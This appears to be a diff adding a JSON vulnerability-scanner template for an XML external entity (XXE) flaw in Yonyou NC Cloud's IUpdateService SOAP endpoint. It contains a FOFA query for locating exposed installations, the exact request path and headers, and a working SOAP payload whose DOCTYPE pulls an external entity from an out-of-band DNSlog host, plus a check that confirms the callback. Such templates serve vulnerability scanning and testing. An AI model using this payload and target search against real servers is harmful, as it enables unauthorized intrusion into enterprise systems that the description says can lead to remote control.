@@ -1,0 +1,41 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud IUpdateService xml外部实体注入",
+  "type": "外部实体注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC-Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现人、财、物、客的 全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。该系统/uapws/service/nc.uap.oba.update.IUpdateService接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器被远控。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/Client/Uclient/UClient.exe\"||body=\"ufida.ico\"||body=\"nccloud\"||body=\"/api/uclient/public/\""
+  },
+  "protocol": "http",
+  "link": "https://cn-sec.com/archives/2517579.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "dnslog",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/uapws/service/nc.uap.oba.update.IUpdateService",
+      "header": {
+        "Content-Type": "text/xml;charset=UTF-8",
+        "SOAPAction": "urn:getResult"
+      },
+      "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:iup=\"http://update.oba.uap.nc/IUpdateService\">\\n<soapenv:Header/>\\n<soapenv:Body>\\n<iup:getResult>\\n<!--type: string-->\\n<iup:string><![CDATA[\\n<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM \"http://{{m:rep}}\">%aaa;%ccc;%ddd;]>\\n<xxx/>]]></iup:string>\\n</iup:getResult>\\n</soapenv:Body>\\n</soapenv:Envelope>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "model": "dnslog"
+        }
+      ]
+    }
+  }
+}
